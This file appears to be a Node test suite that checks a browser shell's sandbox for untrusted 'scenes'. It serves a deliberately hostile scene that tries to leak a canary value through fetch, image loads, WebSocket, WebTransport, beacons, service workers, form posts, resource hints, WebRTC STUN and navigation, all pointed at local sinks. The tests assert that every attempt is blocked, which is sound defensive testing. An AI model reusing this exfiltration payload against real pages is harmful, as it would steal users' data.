// Security review probes: the reference browser shell's scene isolation, in a
// real browser. Opt in with SENATE_SCENE_CHROME (a Chrome binary) or
// SENATE_SCENE_WEBKIT (the entry module of an installed Playwright).
// The shell's built-in example bundle is replaced by a hostile scene that
// tries to send the Observe snapshot it receives off the page. The
// sinks are local and the host verifies that the scene saw the fixture.
import { spawn } from "node:child_process";
import { once } from "node:events";
import { setTimeout as delay } from "node:timers/promises";
import { createSocket } from "node:dgram";
import { readFile, mkdtemp, rm } from "node:fs/promises";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import assert from "node:assert/strict";
import test from "node:test";

const chrome = process.env.SENATE_SCENE_CHROME;
const webkit = process.env.SENATE_SCENE_WEBKIT;
const browserEnabled = chrome || webkit;
const skip = !browserEnabled && "set SENATE_SCENE_CHROME or SENATE_SCENE_WEBKIT";
const packages = new URL("../../", import.meta.url);
const fixture = new URL("../../../docs/observe/v1/fixtures/state.json", import.meta.url);
const CANARY = "canary-committee";

const listen = (server) => new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve(server.address().port)));

async function probe() {
  const hits = [];
  const served = { snapshot: false, scene: false };
  let protections;
  const udp = [];
  const sink = createServer((req, res) => { hits.push(req.url); res.end(); });
  let connections = 0;
  const preconnect = createServer((req, res) => { hits.push(req.url); res.end(); });
  preconnect.on("connection", () => connections++);
  const preconnectPort = await listen(preconnect);
  sink.on("upgrade", (request, socket) => { hits.push(request.url); socket.destroy(); });
  const sinkPort = await listen(sink);
  const transport = createSocket("udp4");
  let transportPackets = 0;
  transport.on("message", () => transportPackets++);
  await new Promise((resolve) => transport.bind(sinkPort, "127.0.0.1", resolve));
  const socket = createSocket("udp4");
  socket.on("message", (msg) => udp.push(msg.length));
  await new Promise((resolve) => socket.bind(0, "127.0.0.1", resolve));
  const udpPort = socket.address().port;
  const state = JSON.parse(await readFile(fixture, "utf8"));
  state.committees[0].name = CANARY;

  const hostile = `<!doctype html><meta charset="utf-8"><title>hostile</title>
<noscript><link rel="preconnect"></noscript>
<iframe title="fallback" srcdoc="<p>Fallback</p>"></iframe><object></object><embed>
<template id="realm"><iframe title="template fallback"></iframe><noscript>fallback</noscript></template>
<template id="hint"><link rel="preconnect" href="http://127.0.0.1:${preconnectPort}"></template>
<script type="module">
/* SCENE_SDK */
const host = await fromParent();
host.subscribe(({ type, data }) => {
  if (type !== "observe.snapshot") return;
  const leak = encodeURIComponent(data.snapshot.committees[0].name);
  void host.storage.set("probe_seen", true);
  const realmNames = ["iframe", "frame", "object", "embed"];
  const blocks = (create) => {
    try { create(); return false; } catch (error) { return error.name === "SecurityError"; }
  };
  const safeTemplate = document.querySelector("#realm").content;
  void host.storage.set("protections", {
    nested: window.length === 0
      && realmNames.every((name) => blocks(() => document.createElement(name))
        && blocks(() => document.createElementNS("http://www.w3.org/1999/xhtml", name)))
      && !document.querySelector("iframe, frame, object, embed")
      && !safeTemplate.querySelector("iframe, frame, object, embed")
      && window.open === undefined && window.Worker === undefined && window.SharedWorker === undefined
      && (!window.Worklet || window.Worklet.prototype.addModule === undefined),
    markup: !document.querySelector("link, noscript") && !safeTemplate.querySelector("link, noscript"),
  });
  const base = "http://127.0.0.1:${sinkPort}";
  const attempt = (run) => { try { run(); } catch {} };
  attempt(() => fetch(base + "/fetch?" + leak).catch(() => {}));
  attempt(() => { new Image().src = base + "/img?" + leak; });
  attempt(() => new WebSocket("ws://127.0.0.1:${sinkPort}/websocket?" + leak));
  attempt(() => new WebTransport("https://127.0.0.1:${sinkPort}/webtransport?" + leak).ready.catch(() => {}));
  attempt(() => navigator.sendBeacon(base + "/beacon?" + leak, leak));
  attempt(() => navigator.serviceWorker.register(base + "/sw?" + leak).catch(() => {}));
  attempt(() => {
    const form = document.createElement("form");
    form.method = "post";
    form.action = base + "/form?" + leak;
    document.body.append(form);
    form.submit();
  });
  for (const [rel, href] of [
    ["preconnect", "http://127.0.0.1:${preconnectPort}"],
    ["dns-prefetch", "http://senate-scene-dns-probe.invalid"],
  ]) {
    attempt(() => {
      const link = document.createElement("link");
      link.rel = rel;
      link.href = href;
      document.head.append(link);
    });
    const markup = '<link rel="' + rel + '" href="' + href + '">';
    attempt(() => document.head.insertAdjacentHTML("beforeend", markup));
    attempt(() => {
      const div = document.createElement("div");
      div.setHTML(markup);
      document.body.append(div);
    });
  }
  attempt(() => document.head.append(document.querySelector("#hint").content.cloneNode(true)));
  function rtc(realm) {
    const pc = new realm.RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${udpPort}" }] });
    pc.createDataChannel("x");
    pc.createOffer().then((offer) => pc.setLocalDescription(offer)).catch(() => {});
  }
  attempt(() => rtc(window));
  attempt(() => {
    const child = document.createElement("iframe");
    document.body.append(child);
    attempt(() => rtc(child.contentWindow));
    attempt(() => rtc(window.frames[window.length - 1]));
  });
  setTimeout(() => { location.href = "http://127.0.0.1:${sinkPort}/nav?" + leak; }, 1500);
});
await host.ready();
</script>`;

  const files = createServer(async (req, res) => {
    const url = new URL(req.url, "http://x");
    if (url.pathname === "/test-scene-ran") {
      served.scene = true;
      return res.end();
    }
    if (url.pathname === "/test-scene-protections") {
      protections = Object.fromEntries(url.searchParams);
      return res.end();
    }
    if (req.method === "OPTIONS") {
      res.writeHead(204, {
        "access-control-allow-origin": req.headers.origin ?? "",
        "access-control-allow-headers": "authorization, last-event-id",
        "access-control-allow-methods": "GET", vary: "Origin",
      });
      return res.end();
    }
    const cors = { "access-control-allow-origin": req.headers.origin ?? "", vary: "Origin" };
    if (url.pathname === "/v1/observe/state") {
      served.snapshot = true;
      res.writeHead(200, { ...cors, "content-type": "application/json" });
      return res.end(JSON.stringify(state));
    }
    if (url.pathname === "/v1/observe/events") {
      res.writeHead(200, { ...cors, "content-type": "text/event-stream" });
      return res.write(": ping\n\n");
    }
    if (url.pathname.endsWith("/browser/example.html")) {
      res.writeHead(200, { "content-type": "text/html" });
      return res.end(hostile);
    }
    try {
      let body = await readFile(new URL(`.${url.pathname}`, packages));
      const type = url.pathname.endsWith(".js") ? "text/javascript" : url.pathname.endsWith(".css") ? "text/css" : "text/html";
      if (url.pathname.endsWith("/browser/index.html")) {
        body = `${body}<script type="module">
const save = Storage.prototype.setItem;
Storage.prototype.setItem = function (key, value) {
  save.call(this, key, value);
  if (value.includes('"probe_seen":true')) void fetch("/test-scene-ran");
  const protections = JSON.parse(value).protections;
  if (protections) void fetch("/test-scene-protections?" + new URLSearchParams(protections));
};
const form = document.querySelector("form");
form.elements.namedItem("endpoint").value = location.origin;
form.elements.namedItem("token").value = "obs1_test";
form.requestSubmit();
</script>`;
      }
      res.writeHead(200, { "content-type": type });
      res.end(body);
    } catch {
      res.writeHead(404);
      res.end();
    }
  });
  const port = await listen(files);
  const profile = await mkdtemp(join(tmpdir(), "scene-chrome-"));
  const netlog = join(profile, "network.json");
  let network;
  try {
    if (webkit) {
      const { webkit: engine } = await import(webkit);
      const browser = await engine.launch();
      try {
        const page = await browser.newPage();
        await page.goto(`http://127.0.0.1:${port}/senate-scene-host/browser/index.html`);
        await delay(6000);
      } finally {
        await browser.close();
      }
    } else {
      const child = spawn(chrome, [
        "--headless=new", "--no-first-run", "--no-default-browser-check", "--disable-background-networking",
        "--host-resolver-rules=MAP senate-scene-dns-probe.invalid 127.0.0.1",
        `--user-data-dir=${profile}`, `--log-net-log=${netlog}`,
        `http://127.0.0.1:${port}/senate-scene-host/browser/index.html`,
      ], { stdio: ["ignore", "ignore", "pipe"] });
      let errors = "";
      child.stderr.on("data", (bytes) => { errors = (errors + bytes).slice(-4096); });
      const exited = once(child, "exit");
      const early = await Promise.race([exited, delay(6000, null)]);
      if (early === null) {
        child.kill();
        await exited;
      }
      // A Chrome helper can hold the inherited stderr pipe after exit.
      child.stderr.destroy();
      assert.equal(early, null, `Chrome exited before the browser probe completed: ${errors}`);
      const raw = await readFile(netlog, "utf8");
      const marker = /,\s*"events"\s*:\s*\[/.exec(raw);
      assert.ok(marker, "Chrome wrote the NetLog header");
      const header = JSON.parse(raw.slice(0, marker.index) + "}");
      // NetLog writes one event per line. SIGTERM can leave its final line
      // and footer incomplete, so only discard that trailing partial record.
      const lines = raw.slice(marker.index + marker[0].length).split("\n").slice(0, -1);
      const events = lines.map((line) => line.trim().replace(/,$/, ""))
        .filter((line) => line.startsWith("{") && line.endsWith("}"))
        .map((line) => JSON.parse(line));
      assert.ok(events.length, "Chrome logged the probe traffic");
      network = { constants: header.constants, events };
    }
  } finally {
    for (const server of [sink, preconnect, files]) {
      server.close();
      server.closeAllConnections();
    }
    socket.close();
    transport.close();
    await rm(profile, { recursive: true, force: true, maxRetries: 5 });
  }
  const dnsTypes = new Set(Object.entries(network?.constants.logEventTypes ?? {})
    .filter(([name]) => name.startsWith("HOST_RESOLVER") || name.startsWith("DNS_TRANSACTION"))
    .map(([, number]) => number));
  const dns = (network?.events ?? []).filter(({ type, params }) => dnsTypes.has(type)
    && JSON.stringify(params)?.includes("senate-scene-dns-probe.invalid"));
  return { hits, udp, served, connections, dns, transportPackets, protections };
}

const run = browserEnabled ? probe() : undefined;
run?.catch(() => {});

test("a hostile scene cannot use fetch-backed APIs, resource hints or navigation", { skip }, async () => {
  const { hits, served, connections, dns, transportPackets } = await run;
  assert.ok(served.snapshot && served.scene, "the scene received and acted on the snapshot");
  assert.deepEqual(hits, []);
  assert.equal(connections, 0, "scene initiated a connection before a request");
  if (chrome && !webkit) assert.deepEqual(dns, []);
  assert.equal(transportPackets, 0, "scene sent a WebTransport datagram");
});

test("a hostile scene cannot reach the network over WebRTC", { skip }, async () => {
  const { udp, served } = await run;
  assert.ok(served.scene, "the scene received and acted on the snapshot");
  assert.equal(udp.length, 0, `scene sent ${udp.length} UDP packet(s) to a STUN server it chose`);
});

test("the scene has no nested browsing contexts or popup, worker or worklet entry points", { skip }, async () => {
  const { protections } = await run;
  assert.equal(protections?.nested, "true");
});

test("the rendered scene discards resource hints and noscript markup, including in templates", { skip }, async () => {
  const { protections } = await run;
  assert.equal(protections?.markup, "true");
});
